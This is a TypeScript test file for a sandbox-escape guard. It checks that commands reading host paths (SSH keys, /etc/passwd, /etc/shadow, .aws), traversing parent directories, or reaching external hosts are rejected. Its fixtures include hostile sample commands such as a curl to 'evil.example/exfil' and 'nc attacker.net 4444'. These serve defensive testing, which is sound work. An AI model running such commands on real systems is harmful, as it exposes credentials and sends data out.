import { describe, expect, it } from "vitest";
import type { SandboxPolicy, SandboxRunRequest } from "@nlc/shared";
import { DEFAULT_SANDBOX_POLICY } from "@nlc/shared";
import {
  assertNoSandboxEscape,
  describeMode,
  routeMode,
} from "./sandbox-policy.js";
import { SandboxError } from "./errors.js";

function makeReq(overrides: Partial<SandboxRunRequest> = {}): SandboxRunRequest {
  return {
    command: "pnpm test",
    workspaceRoot: "/work",
    runId: "run-1",
    ...overrides,
  };
}

describe("routeMode", () => {
  it("returns the mode carried by the policy", () => {
    expect(routeMode(DEFAULT_SANDBOX_POLICY)).toBe("whitelist");
    const docker: SandboxPolicy = { ...DEFAULT_SANDBOX_POLICY, mode: "docker" };
    expect(routeMode(docker)).toBe("docker");
    const wsl: SandboxPolicy = { ...DEFAULT_SANDBOX_POLICY, mode: "wsl" };
    expect(routeMode(wsl)).toBe("wsl");
  });
});

describe("describeMode", () => {
  it("produces a distinct label per mode", () => {
    const labels = new Set([
      describeMode("whitelist"),
      describeMode("wsl"),
      describeMode("docker"),
    ]);
    expect(labels.size).toBe(3);
  });
});

describe("assertNoSandboxEscape - host paths", () => {
  it("accepts relative workspace commands", () => {
    expect(() => assertNoSandboxEscape(makeReq({ command: "pnpm build" }))).not.toThrow();
    expect(() =>
      assertNoSandboxEscape(makeReq({ command: "node ./scripts/run.js src/index.ts" })),
    ).not.toThrow();
  });

  it("rejects an empty command", () => {
    expect(() => assertNoSandboxEscape(makeReq({ command: "   " }))).toThrow(SandboxError);
  });

  it("rejects Windows drive-letter host paths", () => {
    expect(() =>
      assertNoSandboxEscape(makeReq({ command: "cat C:\\Users\\me\\.ssh\\id_rsa" })),
    ).toThrow(SandboxError);
    expect(() =>
      assertNoSandboxEscape(makeReq({ command: "type D:/secrets.txt" })),
    ).toThrow(SandboxError);
  });

  it("rejects UNC / WSL host shares", () => {
    expect(() =>
      assertNoSandboxEscape(makeReq({ command: "cat \\\\server\\share\\file" })),
    ).toThrow(SandboxError);
  });

  it("rejects Unix host filesystem reads", () => {
    expect(() => assertNoSandboxEscape(makeReq({ command: "cat /etc/passwd" }))).toThrow(
      SandboxError,
    );
    expect(() =>
      assertNoSandboxEscape(makeReq({ command: "ls /root/.aws" })),
    ).toThrow(SandboxError);
  });

  it("rejects parent-directory traversal", () => {
    expect(() =>
      assertNoSandboxEscape(makeReq({ command: "cat ../../etc/shadow" })),
    ).toThrow(SandboxError);
  });
});

describe("assertNoSandboxEscape - network egress", () => {
  it("rejects curl to an external host when network is off", () => {
    expect(() =>
      assertNoSandboxEscape(makeReq({ command: "curl https://evil.example/exfil" })),
    ).toThrow(SandboxError);
  });

  it("rejects wget, nc, and ssh to external hosts", () => {
    expect(() =>
      assertNoSandboxEscape(makeReq({ command: "wget http://example.com/x" })),
    ).toThrow(SandboxError);
    expect(() =>
      assertNoSandboxEscape(makeReq({ command: "nc attacker.net 4444" })),
    ).toThrow(SandboxError);
    expect(() =>
      assertNoSandboxEscape(makeReq({ command: "ssh user@10.20.30.40:22" })),
    ).toThrow(SandboxError);
  });

  it("allows network tools targeting localhost", () => {
    expect(() =>
      assertNoSandboxEscape(makeReq({ command: "curl http://localhost:3000/health" })),
    ).not.toThrow();
    expect(() =>
      assertNoSandboxEscape(makeReq({ command: "curl http://127.0.0.1:8080" })),
    ).not.toThrow();
  });

  it("permits external network egress when allowNetwork is true", () => {
    expect(() =>
      assertNoSandboxEscape(
        makeReq({ command: "curl https://registry.npmjs.org", allowNetwork: true }),
      ),
    ).not.toThrow();
  });
});
